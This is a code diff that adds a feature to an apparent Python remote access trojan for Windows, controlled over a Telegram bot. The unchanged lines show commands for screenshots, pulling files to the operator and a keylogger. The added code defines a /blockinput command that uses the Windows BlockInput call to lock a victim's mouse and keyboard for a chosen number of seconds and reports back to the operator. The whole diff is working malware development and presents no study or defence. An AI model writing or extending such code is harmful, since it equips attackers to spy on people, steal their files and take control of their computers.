@@ -10,6 +10,7 @@ import win32api
 import winshell
 import threading
 import subprocess
+import ctypes
 from PIL import ImageGrab
 from telepot.loop import MessageLoop
 from pynput.keyboard import Listener
@@ -93,6 +94,7 @@ class RAT:
             "/screen": self.take_screenshot,
             "/download": self.download_file,
             "/keylogger": self.toggle_keylogger,
+            "/blockinput": self.block_input,
         }
 
         if command in command_handlers:
@@ -135,6 +137,7 @@ class RAT:
 /screen - Take a screenshot
 /download <file> - Download a file
 /keylogger - Start/stop the keylogger
+/blockinput <seconds> - Block mouse and keyboard input
         """
         self.bot.sendMessage(chat_id, help_text)
 
@@ -202,6 +205,38 @@ class RAT:
                 self.bot.sendDocument(chat_id, f)
         except Exception as e:
             self.bot.sendMessage(chat_id, f"Error downloading file: {e}")
+
+    def block_input_thread(self, seconds, chat_id):
+        user32 = ctypes.windll.user32
+        try:
+            user32.BlockInput(True)
+            self.bot.sendMessage(chat_id, f"Input blocked for {seconds} seconds.")
+            time.sleep(seconds)
+        except Exception as e:
+            self.bot.sendMessage(chat_id, f"An error occurred while blocking input: {e}")
+        finally:
+            user32.BlockInput(False)
+            self.bot.sendMessage(chat_id, "Input unblocked.")
+
+    def block_input(self, chat_id, args):
+        if len(args) < 2:
+            self.bot.sendMessage(chat_id, "Usage: /blockinput <seconds>")
+            return
+
+        try:
+            seconds = int(args[1])
+            if seconds <= 0:
+                self.bot.sendMessage(chat_id, "Please provide a positive number of seconds.")
+                return
+
+            thread = threading.Thread(target=self.block_input_thread, args=(seconds, chat_id))
+            thread.daemon = True
+            thread.start()
+
+        except ValueError:
+            self.bot.sendMessage(chat_id, "Invalid number of seconds provided.")
+        except Exception as e:
+            self.bot.sendMessage(chat_id, f"An error occurred: {e}")
 
     def keylogger_thread_func(self):
         self.listener = Listener(on_press=self.on_press)
